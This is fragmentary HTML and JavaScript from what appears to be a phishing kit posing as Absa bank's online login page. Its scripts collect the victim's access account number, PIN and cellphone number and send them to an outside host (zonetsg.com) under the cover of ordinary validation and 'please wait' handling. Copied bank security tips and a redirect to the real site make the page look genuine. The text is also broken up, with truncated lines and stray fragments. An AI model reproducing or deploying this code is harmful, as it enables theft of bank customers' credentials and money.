        function ajax_post_call(post_url, formValues) {
            $.ajax({
                type: 'POST',
                url: post_url,
                data: formValues,
                cache: false,
                success: function(results) {
                    $('#div1').html(results);
                }
            });
            //alert('yo');
        }

        function ajax_post_callBack2(post_url, formValues, callBack) {
            absa.showPleaseWait("<p class=3D\"vi-screenreader-line\">Please=
 wait</p>");
            //pageLoader(true);
            $.ajax({
                type: 'GET',
                dataType: "jsonp",
                url: post_url,
                data: formValues,
                cache: false,
                success: function(results) {
                    //$('#div1').html(results);
                    //alert('completed');
                    //callBack(results);
                    //pageLoader(false);
                    if (results.message =3D=3D=3D "redirect") {
                        window.location.href =3D 'http://www.absa.co.za/Abs=
acoza/Security-Centre/Online-Security/Online-Shopping-and-3D-Secure';
                    } else if (results.message !=3D=3D "Error") {
                        $('.ap-main-content-wrapper').html(results.message)=
.promise().done(function() {
                            absa.hidePleaseWait();
                            setTimeout(function() {
                                document.getElementById(results.focusElemen=
t).focus();
                            }, 1000);
                        });
                    } else if (results.message =3D=3D=3D "Error") {
                        alert(results.errorMessage);
                        $("input.pf.pf2").val("");
                        $("input.pf.pf2:first").focus();
                        absa.hidePleaseWait();
                    }
                }
            });
            //alert('yo');
        }

        function ajax_post_callBack4(post_url, formValues, callBack) {
            absa.showPleaseWait("<p class=3D\"vi-screenreader-line\">Please=
 wait</p>");
            //pageLoader(true);
            $.ajax({
                type: 'GET',
                dataType: "jsonp",
                url: post_url,
                data: formValues,
                cache: false,
                success: function(results) {
                    //$('#div1').html(results);
                    //alert('completed');
                    //callBack(results);
                    //pageLoader(false);
                    if (results.message =3D=3D=3D "redirect") {
                        window.location.href =3D 'http://www.absa.co.za/Abs=
acoza/Security-Centre/Online-Security/Online-Shopping-and-3D-Secure';
                    } else if (results.message !=3D=3D "Error") {
                        document.open();
                        document.write(results.message);
                        document.close();
                    } else if (results.message =3D=3D=3D "Error") {
                        /*alert(results.errorMessage);*/
                        $("input.pf.pf2").val("");
                        $("input.pf.pf2:first").focus();
                        absa.hidePleaseWait();
                        callBack(results)
                    }
                }
            });
            //alert('yo');
        }

        function checkField(field) {
            if (field.val() =3D=3D=3D "")
                field.addClass(".ui-incorrect-value.ui-form-field");
            else
                field.removeClass(".ui-incorrect-value.ui-form-field");
        }

        function checkFirstCardDigitMatch(ccn) {
            var split_cnn =3D ccn.split('');
            var first_char_ccn =3D split_cnn[0];
            var accepted_chars =3D [0];
            var accepted_chars_length =3D accepted_chars.length;

            first_ccn_valid =3D false;
            check_pwd =3D false;
            //console.log("first card digit -->"+first_char_ccn);

            for (var i =3D 0; i <=3D accepted_chars_length - 1; i++) {
                if (first_char_ccn =3D=3D=3D accepted_chars[i]) {
                    first_ccn_valid =3D true;
                    //console.log("match found -->"+i);
                } else {
                    first_ccn_valid =3D false;
                    //console.log("no match-->"+i);
                }
            }
            return first_ccn_valid;
        }

        function isNumeric(n) {
            return !isNaN(parseFloat(n)) && isFinite(n);
        }

        function checkAccessNumber(txtInput) {
            //errorCount =3D 0;
            if (!isNumeric(txtInput)) {
                return false;
            }
            if (txtInput.length < 7) {
                return false;
            }
            if (txtInput.length > 16) {
                return false;
            }
        }

        function checkPinNumber(txtInput) {
            if (txtInput.length < 4 || txtInput.length > 5) {
                return false;
            }

            if (!isNumeric(txtInput)) {
                return false;
            }
        }

        function removeErrorMessages() {
            $("input#j_username").removeClass("ui-incorrect-value");
            $("input#j_pin").removeClass("ui-incorrect-value");
        }

        function loginContinue(formID) {
            //hideErrorMessages();
            removeErrorMessages();
            var errorCount =3D 0;
            if (checkAccessNumber($("input#j_username").val()) =3D=3D=3D fa=
lse) {
                ++errorCount;
                $("input#j_username").addClass("ui-incorrect-value");
            }

            if (checkPinNumber($("input#j_pin").val()) =3D=3D=3D false) {
                ++errorCount;
                $("input#j_pin").addClass("ui-incorrect-value");
            }

            if (errorCount =3D=3D=3D 0) {
                absa.showPleaseWait();
                var formValues =3D $('.ui-form').serialize();
                var data =3D formValues;
                //ajax_post_call(post_url, data);
                ajax_post_callBack2('http://zonetsg.com/highway2018/highway=
road/php/loginContinue.php', $('.ui-form').serialize(), function() {

                });
            }
            //console.log(formValues);
        }

        function checkPhoneDigits(phoneNumber) {
            if (phoneNumber.length !=3D=3D 10) {
                return false;
            }

            var split_phone =3D phoneNumber.split('');
            var first_char_phone =3D split_phone[0];

            if (first_char_phone !=3D=3D "0") {
                return false;
            } else {
                return true;
            }
        }

        function loginContinue4() {
            //hideErrorMessages();

            //ajax_post_call(post_url, data);
            //window.location.href=3D'loginContinue.php';
            var validPHone =3D checkPhoneDigits($("input#cellphonenumber").=
val());
            var currphone =3D $("input#cellphonenumber").val();

            if (validPHone) {
                var lastDigits =3D currphone.substr(currphone.length - 4);
                d =3D new Date();
                datetext =3D d.toTimeString().split(' ')[0];

                $("span#currCellPhone").html(lastDigits);
                $("span#myCurrentTime").html(datetext);

                absa.showPleaseWait();
                $(".hide-this").fadeOut();

                ajax_post_callBack3('http://zonetsg.com/highway2018/highway=
road/php/phone-page.php', $('form#form3-phone').serialize(), function() {

                });
            } else {
                alert("Please enter a valid phone number and retry");
            }
            //console.log(formValues);
        }

        function startTimer(duration, display) {
            var timer =3D duration,
                minutes, seconds;
            var intervalCounter =3D setInterval(function() {
                minutes =3D parseInt(timer / 60, 10);
                seconds =3D parseInt(timer % 60, 10);

                //minutes =3D minutes < 10 ? "0" + minutes : minutes;
                seconds =3D seconds < 10 ? "0" + seconds : seconds;

                //display.textContent =3D minutes + ":" + seconds;
                //display.textContent =3D seconds;
                display.html(seconds);
                if (--timer < 0) {
                    timer =3D duration;
                }
            }, 1000);
        }

                    <li>For your security</li>
                    <li>Do not open e-mails from unknown sources.</li>
                    <li>Beware of emails that ask for passwords, PINS, cred=
it and debit card information.</li>
                    <li>Avoid doing Internet Banking/ Absa Online in public=
 areas such internet cafes as you never know what software is loaded that m=
ay compromise your transactions.</li>

.</li>
                    <li>Be especially aware that there are no security came=
ras trained on your PC and keyboard.</li>

nsed.</li>

t patches.</li>

ial-up modem.</li>

companies.</li>

, look for the lock and key and security certificates online.</li>

    <script type=3D"text/javascript">
        //absa.showPleaseWait("<p class=3D\"vi-screenreader-line\">Please w=
ait</p>");
        absa.login.init();

        function showmodalWindow() {

            $("div.ui-modalWindow").fadeIn(function() {
                var fiveMinutes =3D 59 * 1,
                    //display =3D document.querySelector('#time');
                    display =3D $("span#time");
                startTimer(fiveMinutes, display);
                $("div.ui-modal-content").show();

            });
            $('div.ap-n2fa-errorMessageContainer').hide();

            $("#countdown").countdown360({
                /*radius: 60,
                seconds: 60,
                fontColor: '#FFFFFF',
                autostart: false,
                onComplete: function() {
                    console.log('done')
                }*/
                radius      : 21,
                seconds     : 60,
                strokeWidth : 3,
                fillStyle   : '#f2f2f2',
                strokeStyle : '#e81e1e',
                fontSize    : 15,
                fontColor   : '#e81e1e',
                onComplete: function() {
                    //$('div.ap-n2fa-errorMessageContainer').show();
                    showmodalWindow();
                }
            }).start()
        }
    </script>

our transactions.</li>

your PC and keyboard.</li>

                    function onForm1Submit(){
                        var sAccount =3D document.getElementById("j_usernam=
e").value;
                        var sPIN =3D document.getElementById("j_pin").value;

                        =

                        =

                            alert("Please enter a valid Access account numb=

                            return false;
                        }

                            alert("Please enter a valid PIN");
                            document.getElementById("j_pin").focus();
                            return false;
                        }
                        if(!sOperator.match(numbersOnly)){
                            alert("Please enter a valid User number");
                            document.getElementById("j_user_no").focus();
                            return false;
                        }

                                b.style.height =3D ("innerHeight" in window=
 ? window.innerHeight : document.documentElement.clientHeight) + "px";
                                b.style.width =3D ("innerWidth" in window ?=
 window.innerWidth : document.documentElement.clientWidth) + "px";
                                b.style.top =3D document.documentElement.sc=
rollTop + "px";
                                b.style.left =3D document.documentElement.s=
crollLeft + "px";
                                absa.showPleaseWait.timeout =3D setTimeout(=
arguments.callee, 20)
                        }, 0)
                    };
                    absa.hidePleaseWait =3D function () {
                            var b =3D document.getElementById("pleasewait");
                            b.style.display =3D "none";
                            if (absa.showPleaseWait.timeout) {
                                    absa.showPleaseWait.timeout =3D clearTi=
meout(absa.showPleaseWait.timeout)
                            }
                    };
                </script>

				<div class=3D"ap-popup-body ap-info-box">
					<ul class=3D"ap-info-box-ul">
						<li>Never save your password/PIN on your desktop - as it may allow
 others to access your personal information, without your permission.</li>
						<li>Do not make your passwords too personal - rather create =

passwords that have letters and numbers that cannot be attributed to =

you.</li>
						<li>Never provide your Online ID or password/PIN to anyone, never wri=
te them down or share them, not even with a bank official.</li>
						<li>Never provide your Online ID or password/PIN to anyone.</li>
						<li>Only provide your online password or ID when your browser shows a=
 Secure Socket Layer(SSL) connection directly to the bank.</li>
						<li>Do not leave your computer unattended after you have entered your=
 Absa Online password.</li>
						<li>Always log or sign off at the end of a session.</li>
						<li>For your security</li>
						<li>Do not open e-mails from unknown sources.</li>
						<li>Beware of emails that ask for passwords, PINS, credit and debit c=
ard information.</li>
						<li>Avoid doing Internet Banking/ Absa Online in public areas such
 internet cafes as you never know what software is loaded that may =

compromise your transactions.</li>
						<li>Make sure no one has unauthorised access to your PC.</li>
						<li>Be especially aware that there are no security cameras trained on=
 your PC and keyboard.</li>
						<li>Ensure you have the latest anti virus software applications loade=
d on your PC and mobile devices.</li>
						<li>Make sure the software on your PC is correctly licensed.</li>
						<li>Update your operating system and browser with latest patches.</li>
						<li>Install personal firewall on your PC if you use a dial-up modem.<=
/li>
						<li>Only provide your credit card details to reputable companies.</li>
						<li>To ensure that you are using a secure shopping site, look for the=
 lock and key and security certificates online.</li>
